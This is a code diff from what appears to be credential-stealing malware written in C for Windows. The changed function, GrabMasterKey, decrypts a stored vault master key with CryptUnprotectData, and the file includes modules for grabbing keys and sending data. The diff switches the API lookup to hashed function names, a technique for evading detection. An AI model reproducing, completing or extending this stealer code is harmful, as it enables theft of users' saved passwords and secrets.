@@ -8,12 +8,13 @@
 #include "../include/PathOps.h"
 #include "../include/MasterKeyGrabber.h"
 #include "../include/SendData.h"
+#include "../include/global.h"
 
 #include <windows.h>
 #include <wincrypt.h>
 #include <stdio.h>
 
-BOOL (WINAPI *pCryptUnprotectData)(DATA_BLOB*, LPWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
+BOOL (WINAPI *CryptUnprotectDataFunc)(DATA_BLOB*, LPWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
 
 void GrabMasterKey(unsigned short *path) {
     HANDLE              FileHandle           = {0};
@@ -91,12 +92,12 @@ void GrabMasterKey(unsigned short *path) {
     if (Crypt32Dll == NULL) {
         return;
     }
-    pCryptUnprotectData = GetFuncAddress(Crypt32Dll, CRYPTUNPROTECTDATA);
-    if (pCryptUnprotectData == NULL) {
+    CryptUnprotectDataFunc = GetFuncAddress(Crypt32Dll, (HashInfo){CRYPTUNPROTECTDATA, 18});
+    if (CryptUnprotectDataFunc == NULL) {
         return;
     }
 
-    if (pCryptUnprotectData(&CryptedVaultKey, NULL, NULL, NULL, NULL, 0, &VaultKey) != 1) {
+    if (CryptUnprotectDataFunc(&CryptedVaultKey, NULL, NULL, NULL, NULL, 0, &VaultKey) != 1) {
         return;
     }
 
